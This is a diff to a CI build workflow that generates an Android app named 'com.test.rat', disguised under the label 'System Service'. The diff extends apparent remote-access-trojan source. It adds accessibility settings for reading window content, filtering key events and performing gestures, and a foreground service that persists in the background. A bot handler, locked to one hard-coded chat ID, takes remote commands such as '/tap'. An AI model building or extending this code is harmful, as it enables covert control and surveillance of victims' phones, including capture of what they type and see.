@@ -16,11 +16,15 @@ jobs:
         run: |
           mkdir -p app/src/main/java/com/test/rat
           mkdir -p app/src/main/res/xml
+          mkdir -p app/src/main/res/values
           
           cat > app/src/main/AndroidManifest.xml <<'EOF'
           <?xml version="1.0" encoding="utf-8"?>
           <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.test.rat">
               <uses-permission android:name="android.permission.INTERNET"/>
+              <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+              
               <application android:label="System Service" android:theme="@android:style/Theme.NoTitleBar">
                   <activity android:name=".MainActivity" android:exported="true">
                       <intent-filter>
@@ -28,7 +32,7 @@ jobs:
                           <category android:name="android.intent.category.LAUNCHER"/>
                       </intent-filter>
                   </activity>
-                  <service android:name=".BotService" android:exported="false"/>
+                  <service android:name=".BotService" android:foregroundServiceType="dataSync" android:exported="false"/>
                   <service android:name=".TapService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:exported="true">
                       <intent-filter><action android:name="android.accessibilityservice.AccessibilityService"/></intent-filter>
                       <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config"/>
@@ -39,13 +43,24 @@ jobs:
 
           cat > app/src/main/res/xml/accessibility_service_config.xml <<'EOF'
           <?xml version="1.0" encoding="utf-8"?>
-          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android" android:accessibilityEventTypes="typeAllMask" android:canPerformGestures="true" />
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+              android:accessibilityEventTypes="typeAllMask"
+              android:accessibilityFeedbackType="feedbackGeneric"
+              android:accessibilityFlags="flagDefault|flagRequestFilterKeyEvents|flagReportViewIds|flagRetrieveInteractiveWindows"
+              android:canPerformGestures="true"
+              android:canRetrieveWindowContent="true"
+              android:description="@string/app_name" />
+          EOF
+
+          cat > app/src/main/res/values/strings.xml <<'EOF'
+          <resources><string name="app_name">System Service</string></resources>
           EOF
 
           cat > app/src/main/java/com/test/rat/MainActivity.java <<'EOF'
           package com.test.rat;
           import android.app.Activity;
           import android.content.Intent;
+          import android.os.Build;
           import android.os.Bundle;
           import android.widget.Button;
           import android.widget.LinearLayout;
@@ -55,6 +70,9 @@ jobs:
           public class MainActivity extends Activity {
               @Override protected void onCreate(Bundle savedInstanceState) {
                   super.onCreate(savedInstanceState);
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                      requestPermissions(new String[]{"android.permission.POST_NOTIFICATIONS"}, 1);
+                  }
                   LinearLayout l = new LinearLayout(this); l.setOrientation(1);
                   Button b1 = new Button(this); b1.setText("Запустить бота");
                   b1.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { startForegroundService(new Intent(MainActivity.this, BotService.class)); } });
@@ -114,7 +132,6 @@ jobs:
                           String text = update.getMessage().getText();
                           long chatId = update.getMessage().getChatId();
                           
-                          // Жесткая привязка к твоему ID (7378212680)
                           if (chatId != 7378212680L) return;
 
                           if (text.startsWith("/tap ")) {
